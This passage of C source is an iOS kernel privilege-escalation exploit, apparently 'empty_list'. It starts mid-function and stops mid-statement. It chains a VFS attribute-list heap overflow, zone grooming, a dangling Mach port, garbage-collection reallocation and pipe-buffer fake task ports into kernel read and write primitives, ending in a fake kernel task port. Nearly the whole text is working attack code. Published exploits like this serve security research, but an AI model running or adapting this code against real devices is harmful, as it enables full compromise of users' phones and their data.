    // clear the inline struct pipebuf
    printf("clearing pipebuf: %llx\n", pipe);
    wk64(pipe + 0x00, 0);
    wk64(pipe + 0x08, 0);
    wk64(pipe + 0x10, 0);
    
    // do the same for the other end:
    ofiles_offset = ofiles_base + ((replacer_pipe+1) * 8);
    
    // struct fileproc
    fileproc = rk64(ofiles_offset);
    
    // struct fileglob
    fileglob = rk64(fileproc + koffset(KSTRUCT_OFFSET_FILEPROC_F_FGLOB));
    
    // struct pipe
    pipe = rk64(fileglob + koffset(KSTRUCT_OFFSET_FILEGLOB_FG_DATA));
    
    printf("clearing pipebuf: %llx\n", pipe);
    wk64(pipe + 0x00, 0);
    wk64(pipe + 0x08, 0);
    wk64(pipe + 0x10, 0);
    for (int i = 0; i < next_read_fd; i++) {
        close(write_fds[i]);
        close(read_fds[i]);
    }
    // that should have cleared everything up!
    printf("done!\n");
    return new_tfp0;
}
#else

#include <sys/resource.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/uio.h>
#include <sys/utsname.h>

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <fcntl.h>
#include <pthread.h>

#include <mach/mach.h>

#include "sploit.h"
#include "offsets.h"
#include "kmem.h"

kern_return_t mach_vm_read(
                           vm_map_t target_task,
                           mach_vm_address_t address,
                           mach_vm_size_t size,
                           vm_offset_t *data,
                           mach_msg_type_number_t *dataCnt);

kern_return_t mach_vm_write(
                            vm_map_t target_task,
                            mach_vm_address_t address,
                            vm_offset_t data,
                            mach_msg_type_number_t dataCnt);

kern_return_t mach_vm_read_overwrite(
                                     vm_map_t target_task,
                                     mach_vm_address_t address,
                                     mach_vm_size_t size,
                                     mach_vm_address_t data,
                                     mach_vm_size_t *outsize);


void increase_limits() {
    struct rlimit lim = {0};
    int err = getrlimit(RLIMIT_NOFILE, &lim);
    if (err != 0) {
        printf("failed to get limits\n");
    }
    printf("rlim.cur: %lld\n", lim.rlim_cur);
    printf("rlim.max: %lld\n", lim.rlim_max);
    
    lim.rlim_cur = 10240;
    
    err = setrlimit(RLIMIT_NOFILE, &lim);
    if (err != 0) {
        printf("failed to set limits\n");
    }
    
    lim.rlim_cur = 0;
    lim.rlim_max = 0;
    err = getrlimit(RLIMIT_NOFILE, &lim);
    if (err != 0) {
        printf("failed to get limits\n");
    }
    printf("rlim.cur: %lld\n", lim.rlim_cur);
    printf("rlim.max: %lld\n", lim.rlim_max);
    
}

#define IO_BITS_ACTIVE 0x80000000
#define IKOT_TASK 2
#define IKOT_NONE 0

void build_fake_task_port(uint8_t* fake_port, uint64_t fake_port_kaddr, uint64_t initial_read_addr, uint64_t vm_map, uint64_t receiver, uint64_t context) {
    // clear the region we'll use:
    memset(fake_port, 0, 0x500);
    
    *(uint32_t*)(fake_port+koffset(KSTRUCT_OFFSET_IPC_PORT_IO_BITS)) = IO_BITS_ACTIVE | IKOT_TASK;
    *(uint32_t*)(fake_port+koffset(KSTRUCT_OFFSET_IPC_PORT_IO_REFERENCES)) = 0xf00d; // leak references
    *(uint32_t*)(fake_port+koffset(KSTRUCT_OFFSET_IPC_PORT_IP_SRIGHTS)) = 0xf00d; // leak srights
    *(uint64_t*)(fake_port+koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER)) = receiver;
    *(uint64_t*)(fake_port+koffset(KSTRUCT_OFFSET_IPC_PORT_IP_CONTEXT)) = context;
    
    
    uint64_t fake_task_kaddr = fake_port_kaddr + 0x100;
    *(uint64_t*)(fake_port+koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT)) = fake_task_kaddr;
    
    uint8_t* fake_task = fake_port + 0x100;
    
    // set the ref_count field of the fake task:
    *(uint32_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_REF_COUNT)) = 0xd00d; // leak references
    
    // make sure the task is active
    *(uint32_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_ACTIVE)) = 1;
    
    // set the vm_map of the fake task:
    *(uint64_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_VM_MAP)) = vm_map;
    
    // set the task lock type of the fake task's lock:
    *(uint8_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_LCK_MTX_TYPE)) = 0x22;
    
    // set the bsd_info pointer to be 0x10 bytes before the desired initial read:
    *(uint64_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO)) = initial_read_addr - 0x10;
}


#define N_EARLY_PORTS 80000
mach_port_t early_ports[N_EARLY_PORTS+20000];
int next_early_port = 0;

void alloc_early_ports() {
    for (int i = 0; i < N_EARLY_PORTS; i++) {
        kern_return_t err;
        err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &early_ports[i]);
        if (err != KERN_SUCCESS) {
            printf("mach_port_allocate failed to allocate a new port for early_ports (%d)\n", i);
        }
    }
    next_early_port = N_EARLY_PORTS-1;
}

mach_port_t steal_early_port() {
    if (next_early_port == 0) {
        printf("out of early ports\n");
        sleep(100);
    }
    mach_port_t p = early_ports[next_early_port];
    next_early_port--;
    //early_ports[next_early_port--] = MACH_PORT_NULL;
    return p;
}

void dump_early_ports(){
    for (int i = 0; i < N_EARLY_PORTS; i++) {
        printf("EARLY %d %08x\n", i, early_ports[i]);
    }
}

void clear_early_ports() {
    for (int i = 0; i < next_early_port; i++) {
        mach_port_destroy(mach_task_self(), early_ports[i]);
    }
}

struct kalloc_16_send_msg {
    mach_msg_header_t hdr;
    mach_msg_body_t body;
    mach_msg_ool_ports_descriptor_t ool_ports;
    uint8_t pad[0x200];
};

extern uint32_t message_size_for_kalloc_size(size_t kalloc_size);

mach_port_t kalloc_16() {
    kern_return_t err;
    // take an early port:
    mach_port_t port = steal_early_port();
    
    // insert a send right:
    mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
    
    uint32_t msg_size = message_size_for_kalloc_size(0x110);
    // send a message with two OOL NULL ports; these will end up in a kalloc.16:
    struct kalloc_16_send_msg kalloc_msg = {0};
    
    kalloc_msg.hdr.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
    kalloc_msg.hdr.msgh_size = msg_size; //sizeof(struct kalloc_16_send_msg);
    kalloc_msg.hdr.msgh_remote_port = port;
    kalloc_msg.hdr.msgh_local_port = MACH_PORT_NULL;
    kalloc_msg.hdr.msgh_id = 0x41414141;
    
    kalloc_msg.body.msgh_descriptor_count = 1;
    
    mach_port_t ool_ports[2] = {0xffffffff, 0xffffffff};
    
    kalloc_msg.ool_ports.address = ool_ports;
    kalloc_msg.ool_ports.count = 2;
    kalloc_msg.ool_ports.deallocate = 0;
    kalloc_msg.ool_ports.disposition = MACH_MSG_TYPE_COPY_SEND;
    kalloc_msg.ool_ports.type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
    kalloc_msg.ool_ports.copy = MACH_MSG_PHYSICAL_COPY;
    
    
    // send it:
    err = mach_msg(&kalloc_msg.hdr,
                   MACH_SEND_MSG|MACH_MSG_OPTION_NONE,
                   (mach_msg_size_t)msg_size,//sizeof(struct kalloc_16_send_msg),
                   0,
                   MACH_PORT_NULL,
                   MACH_MSG_TIMEOUT_NONE,
                   MACH_PORT_NULL);
    if (err != KERN_SUCCESS) {
        printf("sending kalloc.16 message failed %s\n", mach_error_string(err));
    }
    
    return port;
}

#define N_MIDDLE_PORTS 50000
mach_port_t middle_ports[N_MIDDLE_PORTS];
int next_middle_port = 0;

mach_port_t alloc_middle_port() {
    mach_port_t port;
    kern_return_t err;
    err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
    mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND); // added
    if (err != KERN_SUCCESS) {
        printf("failed to alloc middle port\n");
    }
    middle_ports[next_middle_port++] = port;
    return port;
}

struct ool_multi_msg  {
    mach_msg_header_t hdr;
    mach_msg_body_t body;
    mach_msg_ool_ports_descriptor_t ool_ports[0];
};

// to free them either receive the message or destroy the port
mach_port_t hold_kallocs(uint32_t kalloc_size, int allocs_per_message, int messages_to_send, mach_port_t holder_port, mach_port_t* source_ports) {
    if (messages_to_send > MACH_PORT_QLIMIT_LARGE) {
        printf("****************** too many messages\n");
        return MACH_PORT_NULL;
    }
    
    kern_return_t err;
    mach_port_t port = MACH_PORT_NULL;
    
    if (holder_port == MACH_PORT_NULL) {
        err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
        mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
        
        if (err != KERN_SUCCESS) {
            printf("failed to allocate port for hold kallocs\n");
        }
        
        // bump up the number of messages we can enqueue:
        mach_port_limits_t limits = {0};
        limits.mpl_qlimit = MACH_PORT_QLIMIT_LARGE;
        err = mach_port_set_attributes(mach_task_self(),
                                       port,
                                       MACH_PORT_LIMITS_INFO,
                                       (mach_port_info_t)&limits,
                                       MACH_PORT_LIMITS_INFO_COUNT);
        if (err != KERN_SUCCESS) {
            printf(" [-] failed to increase queue limit\n");
            exit(EXIT_FAILURE);
        }
    } else {
        port = holder_port;
    }
    
    // these are MACH_PORT_NULL
    mach_port_t* ports_to_send = calloc(kalloc_size/8, sizeof(mach_port_name_t));
    
    size_t message_size = offsetof(struct ool_multi_msg, ool_ports[allocs_per_message+1]);
    struct ool_multi_msg* msg = malloc(message_size);
    
    memset(msg, 0, message_size);
    
    msg->hdr.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
    msg->hdr.msgh_size = (uint32_t) message_size;
    msg->hdr.msgh_remote_port = port;
    msg->hdr.msgh_local_port = MACH_PORT_NULL;
    msg->hdr.msgh_id = 0x12340101;
    
    msg->body.msgh_descriptor_count = allocs_per_message;
    
    for (int i = 0; i < allocs_per_message; i++) {
        msg->ool_ports[i].address = source_ports != NULL ? source_ports : ports_to_send;
        msg->ool_ports[i].count = kalloc_size/8;
        msg->ool_ports[i].deallocate = 0;
        msg->ool_ports[i].disposition = MACH_MSG_TYPE_COPY_SEND;
        msg->ool_ports[i].type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
        msg->ool_ports[i].copy = MACH_MSG_PHYSICAL_COPY;
    }
    
    for (int i = 0; i < messages_to_send; i++) {
        // send it:
        err = mach_msg(&msg->hdr,
                       MACH_SEND_MSG|MACH_MSG_OPTION_NONE,
                       (uint32_t)message_size,
                       0,
                       MACH_PORT_NULL,
                       MACH_MSG_TIMEOUT_NONE,
                       MACH_PORT_NULL);
        if (err != KERN_SUCCESS) {
            printf("%s\n", mach_error_string(err));
            //exit(EXIT_FAILURE);
        }
    }
    free(ports_to_send);
    free(msg);
    
    return port;
}

uint8_t msg_buf[10000];
void discard_message(mach_port_t port) {
    mach_msg_header_t* msg = (mach_msg_header_t*)msg_buf;
    kern_return_t err;
    err = mach_msg(msg,
                   MACH_RCV_MSG | MACH_MSG_TIMEOUT_NONE, // no timeout
                   0,
                   10000,
                   port,
                   0,
                   0);
    if (err != KERN_SUCCESS){
        printf("error receiving on port: %s\n", mach_error_string(err));
    }
    
    mach_msg_destroy(msg);
}

#include <sys/attr.h>

int vfs_fd = -1;
struct attrlist al = {0};
size_t attrBufSize = 16;
void* attrBuf = NULL;

void prepare_vfs_overflow() {
    vfs_fd = open("/", O_RDONLY);
    if (vfs_fd == -1) {
        perror("unable to open fs root\n");
        return;
    }
    
    
    al.bitmapcount = ATTR_BIT_MAP_COUNT;
    al.volattr = 0xfff;
    al.commonattr = ATTR_CMN_RETURNED_ATTRS;
    
    attrBuf = malloc(attrBufSize);
}

// this will do a kalloc.16, overflow out of it with 8 NULL bytes, then free it
void do_vfs_overflow() {
    int options = 0;
    int err = fgetattrlist(vfs_fd, &al, attrBuf, attrBufSize, options);
    //printf("err: %d\n", err);
}

mach_port_t initial_early_kallocs[80000];
int next_early_kalloc = 0;

mach_port_t middle_kallocs[80000];
int next_middle_kalloc = 0;

volatile int keep_spinning = 1;
void* spinner(void* arg) {
    while(keep_spinning);
    return NULL;
}

#define N_SPINNERS 25
pthread_t spin_threads[N_SPINNERS];

void start_spinners() {
    for (int i = 0; i < N_SPINNERS; i++) {
        pthread_create(&spin_threads[i], NULL, spinner, NULL);
    }
}

void stop_spinners() {
    keep_spinning = 0;
    for (int i = 0; i < N_SPINNERS; i++) {
        pthread_join(spin_threads[i], NULL);
    }
}

const int total_fds = 14*0x1f*8;
int read_ends[total_fds];
int write_ends[total_fds];
int next_pipe_index = 0;

mach_port_t early_read_port = MACH_PORT_NULL;
int early_read_read_fd = -1;
int early_read_write_fd = -1;
uint64_t early_read_known_kaddr = 0;

// read_fd and write_fd are the pipe fds which have a pipe buffer at known_addr
void prepare_early_read_primitive(mach_port_t target_port, int read_fd, int write_fd, uint64_t known_kaddr) {
    early_read_port = target_port;
    early_read_read_fd = read_fd;
    early_read_write_fd = write_fd;
    early_read_known_kaddr = known_kaddr;
}

uint32_t early_rk32(uint64_t kaddr) {
    uint8_t* buf = malloc(0xfff);
    read(early_read_read_fd, buf, 0xfff);
    build_fake_task_port(buf, early_read_known_kaddr, kaddr, 0, 0, 0);
    write(early_read_write_fd, buf, 0xfff);
    
    uint32_t val = 0;
    kern_return_t err = pid_for_task(early_read_port, &val);
    if (err != KERN_SUCCESS) {
        printf("pid_for_task returned %x (%s)\n", err, mach_error_string(err));
    }
    printf("read val via pid_for_task: %08x\n", val);
    free(buf);
    return val;
}

uint64_t early_rk64(uint64_t kaddr) {
    uint64_t lower = (uint64_t)early_rk32(kaddr);
    uint64_t upper = (uint64_t)early_rk32(kaddr + 4);
    uint64_t final = lower | (upper << 32);
    return final;
}

mach_port_t tfp0 = MACH_PORT_NULL;
void prepare_for_rw_with_fake_tfp0(mach_port_t new_tfp0) {
    tfp0 = new_tfp0;
}

void wk32(uint64_t kaddr, uint32_t val) {
    if (tfp0 == MACH_PORT_NULL) {
        printf("attempt to write to kernel memory before any kernel memory write primitives available\n");
        sleep(3);
        return;
    }
    
    kern_return_t err;
    err = mach_vm_write(tfp0,
                        (mach_vm_address_t)kaddr,
                        (vm_offset_t)&val,
                        (mach_msg_type_number_t)sizeof(uint32_t));
    
    if (err != KERN_SUCCESS) {
        printf("tfp0 write failed: %s %x\n", mach_error_string(err), err);
        return;
    }
}

void wk64(uint64_t kaddr, uint64_t val) {
    uint32_t lower = (uint32_t)(val & 0xffffffff);
    uint32_t higher = (uint32_t)(val >> 32);
    wk32(kaddr, lower);
    wk32(kaddr+4, higher);
}

uint32_t rk32(uint64_t kaddr) {
    kern_return_t err;
    uint32_t val = 0;
    mach_vm_size_t outsize = 0;
    err = mach_vm_read_overwrite(tfp0,
                                 (mach_vm_address_t)kaddr,
                                 (mach_vm_size_t)sizeof(uint32_t),
                                 (mach_vm_address_t)&val,
                                 &outsize);
    if (err != KERN_SUCCESS){
        printf("tfp0 read failed %s addr: 0x%llx err:%x port:%x\n", mach_error_string(err), kaddr, err, tfp0);
        sleep(3);
        return 0;
    }
    
    if (outsize != sizeof(uint32_t)){
        printf("tfp0 read was short (expected %lx, got %llx\n", sizeof(uint32_t), outsize);
        sleep(3);
        return 0;
    }
    return val;
}

uint64_t rk64(uint64_t kaddr) {
    uint64_t lower = rk32(kaddr);
    uint64_t higher = rk32(kaddr+4);
    uint64_t full = ((higher<<32) | lower);
    return full;
}


mach_port_t exploit() {
    printf("empty_list by @i41nbeer\n");
    offsets_init();
    
    start_spinners();
    printf("vfs_sploit\n");
    increase_limits();
    
    size_t kernel_page_size = 0;
    host_page_size(mach_host_self(), &kernel_page_size);
    
    /*struct utsname u = { 0 };
     uname(&u);
     if (strstr(u.machine, "iPad5,") == u.machine) {
     kernel_page_size = 0x1000; // this is 4k but host_page_size lies to us
     }
     */
    if (kernel_page_size == 0x4000) {
        printf("this device uses 16k kernel pages\n");
    } else if (kernel_page_size == 0x1000) {
        printf("this device uses 4k kernel pages\n");
    } else {
        printf("this device uses an unsupported kernel page size\n");
        exit(EXIT_FAILURE);
    }
    
    
    prepare_vfs_overflow();
    // set up the heap:
    
    // allocate a pool of early ports; we'll use some of these later
    alloc_early_ports();
    
    if (kernel_page_size == 0x1000) {
        mach_port_t initial_kallocs_holder = hold_kallocs(0x10, 100, 100, MACH_PORT_NULL, NULL);
    }
    
    // 0x110 will be the kalloc size of the ipc_kmsg allocation for the kalloc.16 messages
    // we need to ensure that these allocations don't interfere with the page-level groom,
    // so ensure there's a long freelist for them
    
    // make 30'000 kalloc(0x110) calls then free them all
    mach_port_t flp = hold_kallocs(0x110, 100, 500, MACH_PORT_NULL, NULL);
    mach_port_destroy(mach_task_self(), flp);
    
    // try to groom our initial pattern:
    //   kalloc.16 | ipc_ports | kalloc.16 | ipc_ports ...
    // first off we're just trying to get the pages like that
    
    int INITIAL_PATTERN_REPEATS = kernel_page_size == 0x4000 ? 40 : 60;
    mach_port_t kalloc_holder_port = MACH_PORT_NULL;
    
    
    int kallocs_per_zcram = kernel_page_size/0x10; // 0x1000 with small kernel pages, 0x4000 with large
    int ports_per_zcram = kernel_page_size == 0x1000 ? 0x49 : 0x61;  // 0x3000 with small kernel pages, 0x4000 with large
    
    for (int i = 0; i < INITIAL_PATTERN_REPEATS; i++) {
        // 1 page of kalloc
        for (int i = 0; i < kallocs_per_zcram; i++) {
            mach_port_t p = kalloc_16();
            initial_early_kallocs[next_early_kalloc++] = p;
        }
        
        // 1 full allocation set of ports:
        for (int i = 0; i < ports_per_zcram; i++) {
            mach_port_t port = alloc_middle_port();
        }
    }
    
    // now we hopefully have a nice arrangement of repeated fresh 'k.16 | ipc_port' pages
    // to understand this next bit it's important to notice that zone allocations will come first
    // from intermediate (partially full) pages. This means that if we just start free'ing and
    // allocating k.16 objects somewhere in the middle of the groom they won't be re-used until
    // the current intermediate page is either full or empty.
    
    // this provides a challenge because fresh page's freelist's are filled semi-randomly such that
    // their allocations will go from the inside to the outside:
    //
    //   | 9 8 6 5 2 1 3 4 7 10 | <-- example "randomized" allocation order from a fresh all-free page
    //
    // this means that our final intermediate k.16 and ports pages will look a bit like this:
    //
    //   | - - - 5 2 1 3 4 - - | - - - 4 1 2 3 5 - - |
    //           kalloc.16             ipc_ports
    
    // if we use the overflow to corrupt a freelist entry we'll panic if it gets allocated, so we
    // need to avoid that
    
    // the trick is that by controlling the allocation and free order we can reverse the freelists such that
    // the final intermediate pages will look more like this:
    //
    //  | 1 4 - - - - - 5 3 2 | 2 5 - - - - - 4 3 1 |
    //          kalloc.16               ipc_ports
    //
    // at this point we're much more likely to be able to free a kalloc.16 and realloc it for the overflow
    // such that we can hit the first qword of an ipc_port
    
    
    // free them all, reversing the freelists!
    for (int i = 0; i < next_early_kalloc; i++) {
        discard_message(initial_early_kallocs[i]);
    }
    
    int HOP_BACK = kernel_page_size == 0x4000 ? 16 : 30;
    
    for (int i = 0; i < INITIAL_PATTERN_REPEATS - HOP_BACK; i++) {
        for (int i = 0; i < kallocs_per_zcram; i++) {
            mach_port_t p = kalloc_16();
            middle_kallocs[next_middle_kalloc++] = p;
        }
    }
    
    mach_port_t target_port = MACH_PORT_NULL;
    
    int first_candidate_port_index = next_middle_port - ((HOP_BACK+2)*ports_per_zcram); // 32 35  +2
    int last_candidate_port_index = next_middle_port - ((HOP_BACK-2)*ports_per_zcram);  // 28 25  -2
    
    //sched_yield();
    // wait a second
    // this is a load-bearing sleep - this works better than sched_yield
    // we want this loop to be as fast as possible, and ideally not get pre-empted
    // don't remove this :)
    sleep(1);
    for (int i = 0; i < kallocs_per_zcram; i++) {
        mach_port_t kp = middle_kallocs[next_middle_kalloc-20-1];
        next_middle_kalloc--;
        
        discard_message(kp);
        
        do_vfs_overflow();
        
        // realloc
        mach_port_t replacer_f = kalloc_16();
        
        // loop through the candidate overwrite target ports and see if they were hit
        // we can detect this via mach_port_kobject; if we know the name we pass it is valid
        // but we get KERN_INVALID_RIGHT then we cleared the io_active bit
        
        for (int j = first_candidate_port_index; j < last_candidate_port_index; j++){
            mach_port_t candidate_port = middle_ports[j];
            kern_return_t err;
            natural_t typep = 0;
            mach_vm_address_t addr = 0;
            
            err = mach_port_kobject(mach_task_self(),
                                    candidate_port,
                                    &typep,
                                    &addr);
            if (err != KERN_SUCCESS) {
                printf("found the port! %x\n", candidate_port);
                target_port = candidate_port;
                break;
            }
        }
        if (target_port != MACH_PORT_NULL) {
            break;
        }
    }
    
    stop_spinners();
    
    // lets stash the ports we want to keep:
    
    // we know the dangling port is about 30 loops back from the end of the middle_ports
    // lets keep hold of a region about 3 loop iterations ahead of this
    
#define CANARY_REGION 4
    
    int ports_to_hold = ports_per_zcram; //ports_per_zcram * 3;//0x49*3;
    mach_port_t hold_ports[ports_to_hold];
    for (int i = 0; i < ports_to_hold; i++) {
        int source_index = ((INITIAL_PATTERN_REPEATS - HOP_BACK + CANARY_REGION) * ports_per_zcram) + i;  // 20  10
        hold_ports[i] = middle_ports[source_index];
        middle_ports[source_index] = MACH_PORT_NULL;
    }
    
    // now dump all our ports
    // we can keep the early ports, we'll continue to use them for kallocs and stuff
    
    for (int i = 0; i < next_middle_port; i++) {
        mach_port_t port = middle_ports[i];
        if (port == MACH_PORT_NULL) {
            continue;
        }
        if (port == target_port) {
            // cause the target port to be freed but leave us a dangling entry in the port table
            // note that the port isn't active so we need a code path which will take and drop a reference
            // but won't do anything if the port isn't active (like trying to give us a DEAD_NAME)
            int new_size = 100;
            kern_return_t err = mach_port_set_attributes(mach_task_self(), target_port, MACH_PORT_DNREQUESTS_SIZE, (mach_port_info_t)&new_size, sizeof(int));
            if (err != KERN_SUCCESS) {
                printf("mach_port_set_attributes failed %s\n", mach_error_string(err));
            } else {
                printf("freed the port\n");
            }
        } else {
            mach_port_destroy(mach_task_self(), port);
        }
    }
    
    // 150MB
#define N_COLLECTABLES 3
    mach_port_t collectable_ports[N_COLLECTABLES];
    for (int i = 0; i < N_COLLECTABLES; i++) {
        collectable_ports[i] = hold_kallocs(0x800, 0x3e, 400, MACH_PORT_NULL, NULL);
    }
    
    for (int i = 0; i < N_COLLECTABLES; i++) {
        mach_port_destroy(mach_task_self(), collectable_ports[i]);
    }
    
    
    // choose a port from the middle of the holder range as our canary:
    mach_port_t canary_port = hold_ports[ports_to_hold/2];
    mach_port_insert_right(mach_task_self(), canary_port, canary_port, MACH_MSG_TYPE_MAKE_SEND);
    
    
    // now try to cause the GC by allocating many copies of the replacer object:
    // the goal is to get the canary port overlapping the ip_context field of the dangling port
    mach_port_t replacer_object[0x200] = {0};
    replacer_object[koffset(KSTRUCT_OFFSET_IPC_PORT_IP_CONTEXT)/8] = canary_port;
    
    // the replacer object allocation is a 0x1000 alloc
    // using the same maths as above lets allocate 200 MB of them,
    // slowly, hoping to cause GC:
    //int n_gc_ports = 200;
    int n_gc_ports = 250; // 200
    mach_port_t gc_ports[n_gc_ports];
    for (int i = 0; i < n_gc_ports; i++) {
        gc_ports[i] = hold_kallocs(0x1000, 0x1f, 8, MACH_PORT_NULL, replacer_object);
        printf("gc tick %d\n", i);
        pthread_yield_np();
        usleep(10000);
    }
    printf("did that trigger a gc and realloc?\n");
    
    // if that worked we should now be able to find the address of the canary port:
    uint64_t canary_port_kaddr = 0;
    kern_return_t err;
    err = mach_port_get_context(mach_task_self(), target_port, &canary_port_kaddr);
    if (err != KERN_SUCCESS) {
        printf("error getting context from the target port (but no panic...): %s\n", mach_error_string(err));
    }
    
    printf("the canary port is at %016llx\n", canary_port_kaddr);
    
    // lets modify the port so we can detect when we receive the message which has the OOL_PORTS descriptor which
    // overlaps the dangling target port:
    
    // we should be a bit more careful doing this to not go off the end:
    uint64_t fake_canary_kport_addr = canary_port_kaddr + 0xa8;
    
    err = mach_port_set_context(mach_task_self(), target_port, fake_canary_kport_addr);
    
    
    // lets build the contents of the pipe buffer
    // we're gonna hope that we can get this allocated pretty near the canary port:
    size_t pipe_buffer_size = 0xfff; // this is for kalloc.4096
    uint8_t* pipe_buf = malloc(0x1000);
    memset(pipe_buf, 0, 0x1000);
    
    uint64_t pipe_target_kaddr_offset = kernel_page_size == 0x4000 ? 0x20000 : 0x10000;
    
    uint64_t pipe_target_kaddr = (canary_port_kaddr + pipe_target_kaddr_offset) & (~0xfffULL); // 0x10000
    printf("pipe_target_kaddr: %016llx\n", pipe_target_kaddr);
    
    build_fake_task_port(pipe_buf, pipe_target_kaddr, pipe_target_kaddr, 0, 0, 0);
    
    
    // now go through each of the hold_kalloc messages and receive them.
    // check if they contained the canary port
    // reallocate them
    
    mach_port_t secondary_leaker_ports[200] = {0};
    
    struct {
        mach_msg_header_t hdr;
        mach_msg_body_t body;
        mach_msg_ool_ports_descriptor_t ool_ports[0x1f];
        mach_msg_trailer_t trailer;
        char pad[1000];
    } msg = {0};
    
    printf("sizeof(msg) 0x%x\n", sizeof(msg));
    
    int hit_dangler = 0;
    int dangler_hits = 0;
    printf("the canary port is: %x\n", canary_port);
    
    mach_port_t fake_canary_port = MACH_PORT_NULL;
    
    for (int i = 0; i < n_gc_ports; i++) {
        mach_port_t gc_port = gc_ports[i];
        
        for (int j = 0; j < 8; j++) {
            err = mach_msg(&msg.hdr,
                           MACH_RCV_MSG,
                           0,
                           sizeof(msg),
                           gc_port,
                           0,
                           0);
            if (err != KERN_SUCCESS) {
                printf("failed to receive OOL_PORTS message (%d,%d) %s\n", i, j, mach_error_string(err));
            }
            
            // check each of the canary ports:
            for (int k = 0; k < 0x1f; k++) {
                mach_port_t* ool_ports = msg.ool_ports[k].address;
                mach_port_t tester_port = ool_ports[koffset(KSTRUCT_OFFSET_IPC_PORT_IP_CONTEXT)/8];
                if (tester_port != canary_port) {
                    printf("found the mis-matching OOL discriptor (%x)\n", tester_port);
                    hit_dangler = 1;
                    fake_canary_port = tester_port;
                } else {
                    // drop the UREF
                    mach_port_deallocate(mach_task_self(), tester_port);
                }
            }
        }
        
        if (!hit_dangler) {
            // if we haven't yet hit the dangler, try to reallocate this memory:
            secondary_leaker_ports[i] = hold_kallocs(0x1000, 0x1f, 8, MACH_PORT_NULL, NULL);
        } else {
            if (dangler_hits == 14) {
                // we'll run out of pipe kva so stop now
                printf("hopefully that's enough pipes\n");
                break;
            }
            for (int i = 0; i < (0x1f*8); i++) {
                // we have hit the dangler; from now on out we'll realloc with pipes
                // pipe memory is limited
                int fds[2] = {0};
                int err = pipe(fds);
                if (err != 0) {
                    perror("pipe failed\n");
                }
                
                int read_end = fds[0];
                int write_end = fds[1];
                
                int flags = fcntl(write_end, F_GETFL);
                flags |= O_NONBLOCK;
                fcntl(write_end, F_SETFL, flags);
                
                build_fake_task_port(pipe_buf, pipe_target_kaddr, pipe_target_kaddr, 0, 0, next_pipe_index);
                
                ssize_t amount_written = write(write_end, pipe_buf, 0xfff);
                if (amount_written != 0xfff) {
                    printf("amount written was short: 0x%x\n", amount_written);
                }
                
                read_ends[next_pipe_index] = read_end;
                write_ends[next_pipe_index++] = write_end;
                
            }
            dangler_hits++;
        }
        
    }
    
    
    printf("replaced with pipes hopefully... take a look\n");
    
    // check the kernel object type of the dangling port:
    int otype = 0;
    mach_vm_address_t oaddr = 0;
    err = mach_port_kobject(mach_task_self(), target_port, &otype, &oaddr);
    if (err != KERN_SUCCESS) {
        printf("mach_port_kobject failed: %x %s\n", err, mach_error_string(err));
    }
    printf("dangling port type: %x\n", otype);
    
    uint64_t replacer_pipe_index = 0xfffffff;
    err = mach_port_get_context(mach_task_self(), target_port, &replacer_pipe_index);
    printf("got replaced with pipe fd index %d\n", replacer_pipe_index);
    
    printf("gonna try a read...\n");
    
    uint32_t val = 0;
    err = pid_for_task(target_port, &val);
    if (err != KERN_SUCCESS) {
        printf("pid_for_task returned %x (%s)\n", err, mach_error_string(err));
    }
    printf("read val via pid_for_task: %08x\n", val);
    
    
    // at this point we know:
    //  * which pipe fd overlaps with the dangling port
    //  * the kernel address of the canary port (which is still a dangling port)
    //  * the kernel address of the fake task (which is a pipe buffer, but we don't know which one)
    
    // things will be easier if we can learn the address of the dangling port giving us the address of the pipe buffer and a what/where primitive
    // we could hack around that by always rewriting all the pipes each time I guess...
    
    // for each pipe, apart from the one which we know overlaps with the port, replace the field which determines where to read from, then do the kernel read and see if the value is no longer 0x80000002
    char* old_contents = malloc(0xfff);
    char* new_contents = malloc(0xfff);
    int pipe_target_kaddr_replacer_index = -1;
    for (int i = 0; i < next_pipe_index; i++) {
        if (i == replacer_pipe_index) {
            continue;
        }
        read(read_ends[i], old_contents, 0xfff);
        build_fake_task_port(new_contents, pipe_target_kaddr, pipe_target_kaddr+4, 0, 0, 0);
        write(write_ends[i], new_contents, 0xfff);
        
        // try the read, did it change?
        uint32_t val = 0;
        err = pid_for_task(target_port, &val);
        if (err != KERN_SUCCESS) {
            printf("pid_for_task returned %x (%s)\n", err, mach_error_string(err));
        }
        printf("read val via pid_for_task: %08x\n", val);
        if (val != 0x80000002) {
            printf("replacer fd index %d is at the pipe_target_kaddr\n", i);
            pipe_target_kaddr_replacer_index = i;
            break;
        }
    }
    free(old_contents);
    free(new_contents);
    if (pipe_target_kaddr_replacer_index == -1) {
        printf("failed to find the pipe_target_kaddr_replacer pipe\n");
    }
    
    // now we know which pipe fd matches up with where the fake task is so
    // bootstrap the early read primitives
    
    prepare_early_read_primitive(target_port, read_ends[pipe_target_kaddr_replacer_index], write_ends[pipe_target_kaddr_replacer_index], pipe_target_kaddr);
    
    // we can now use early_rk{32,64}
    
    // send a message to the canary port containing a send right to the host port;
    // use the arbitrary read to find that, and from there find the kernel task port
    
    mach_msg_header_t host_msg = {0};
    host_msg.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, MACH_MSG_TYPE_COPY_SEND);
